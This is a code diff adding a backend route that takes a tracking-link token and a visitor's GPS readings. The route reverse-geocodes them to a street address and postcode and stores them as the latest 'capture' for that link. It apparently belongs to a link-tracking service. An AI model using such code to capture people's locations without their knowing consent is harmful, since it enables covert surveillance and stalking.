@@ -306,5 +306,48 @@ router.post("/credits", async(req, res) => {
     }
 });
 
+// GPS update route — called after redirect
+router.post("/capture-gps", async(req, res) => {
+    try {
+        const { token, gpsLat, gpsLon, gpsAccuracy, gpsAltitude, gpsSpeed, gpsHeading } = req.body;
+        if (!token || !gpsLat || !gpsLon) return res.status(400).json({ error: "missing data" });
+
+        // Reverse geocode
+        const geoData = await reverseGeocode(gpsLat, gpsLon);
+
+        const linksRef = db.collection("trackingLinks");
+        const snap = await linksRef.where("token", "==", token).get();
+        if (snap.empty) return res.status(404).json({ error: "not found" });
+
+        const linkDoc = snap.docs[0];
+        const linkData = linkDoc.data();
+        const captures = linkData.captures || [];
+
+        // Update the LAST capture with GPS data
+        if (captures.length > 0) {
+            const lastCapture = {...captures[captures.length - 1] };
+            lastCapture.gpsLat = gpsLat;
+            lastCapture.gpsLon = gpsLon;
+            lastCapture.gpsAccuracy = gpsAccuracy || null;
+            lastCapture.gpsAltitude = gpsAltitude || null;
+            lastCapture.gpsSpeed = gpsSpeed || null;
+            lastCapture.gpsHeading = gpsHeading || null;
+            lastCapture.gpsAddress = geoData.gpsAddress || null;
+            lastCapture.gpsCity = geoData.gpsCity || null;
+            lastCapture.gpsState = geoData.gpsState || null;
+            lastCapture.gpsPincode = geoData.gpsPincode || null;
+            lastCapture.gpsCountry = geoData.gpsCountry || null;
+            captures[captures.length - 1] = lastCapture;
+
+            await linksRef.doc(linkDoc.id).update({ captures });
+        }
+
+        return res.status(200).json({ ok: true });
+    } catch (err) {
+        console.error("[capture-gps]", err.message);
+        return res.status(500).json({ error: err.message });
+    }
+});
+
 export default router;
 
